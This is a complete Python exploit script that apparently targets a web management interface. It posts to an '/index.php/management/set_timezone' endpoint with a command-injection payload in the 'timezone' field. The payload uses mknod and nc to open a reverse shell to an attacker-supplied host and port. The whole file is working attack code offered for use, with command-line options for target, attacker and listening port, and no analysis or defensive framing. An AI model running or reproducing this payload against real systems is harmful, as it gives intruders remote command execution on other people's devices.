import requests
import argparse
def exploit(target,attacker,port):
url = f'{target}/index.php/management/set_timezone'
headers = {
'Accept': 'application/json, text/javascript, */*; q=0.01',
'X-Requested-With': 'XMLHttpRequest',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Origin': f'{target}',
'Referer': f'{target}/index.php/management/datetime',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'en-US,en;q=0.9',
'Connection': 'close'
}
print(f"Sending Request")
data = {
'timezone': f'`mknod /tmp/pipe p;/bin/sh 0</tmp/pipe | nc
{attacker} {port} 1>/tmp/pipe`'
}
response = requests.post(url, headers=headers, data=data)
# print(response.text)
if __name__ == "__main__":
parser = argparse.ArgumentParser(description='Parse target, attacker,
and port.',)
parser.add_argument('--target','-t', type=str, help='The target IP
address or hostname. example : http://192.168.254')
parser.add_argument('--attacker','-a', type=str, help='The attacker IP
address or hostname.')
parser.add_argument('--port', '-p',type=int, help='Listening port')
args = parser.parse_args()
try:
exploit(args.target,args.attacker,args.port)
except:
parser.print_help()
print("Exploit done")
